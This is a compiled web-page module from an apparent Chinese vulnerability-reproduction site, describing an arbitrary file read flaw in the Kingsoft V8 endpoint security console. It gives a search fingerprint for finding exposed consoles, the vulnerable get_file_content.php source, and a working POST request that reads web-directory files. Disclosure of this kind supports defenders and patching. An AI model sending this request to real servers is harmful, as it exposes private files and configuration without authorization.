import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const l={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>金山 V8 终端安全系统
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;在线安装-V8+终端安全系统Web控制台&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251504895.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件<code>/Console/receive_file/get_file_content.php</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php  
  if(stripos($_POST[&#39;filepath&#39;],&quot;..&quot;) !== false) {
    echo &#39;no file founggd&#39;;
    exit();
  }
  ini_set(&quot;open_basedir&quot;, &quot;../&quot;);
  $file_path = &#39;../&#39;.iconv(&quot;utf-8&quot;,&quot;gb2312&quot;,$_POST[&#39;filepath&#39;]);
  if(!file_exists($file_path)){
    echo &#39;no file founggd&#39;;
    exit();
  }  

  $fp=fopen($file_path,&quot;r&quot;);  
  $file_size=filesize($file_path); 

  $buffer=5024;  
  $file_count=0;  

  while(!feof($fp) &amp;&amp; $file_count&lt;$file_size){  
    $file_con=fread($fp,$buffer);  
    $file_count+=$buffer;  
    echo $file_con;  
  }  
  fclose($fp);  
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>文件中没有任何的过滤 通过 filepaht 参数即可下载任意文件</p><p>由于不能出现 <code>..</code> ，所以只能读取web目录下的文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /receive_file/get_file_content.php

filepath=login.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251507315.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),s=[d];function t(r,c){return i(),n("div",null,s)}const v=e(l,[["render",t],["__file","金山 V8 终端安全系统 get_file_content.php 任意文件读取漏洞.html.vue"]]);export{v as default};
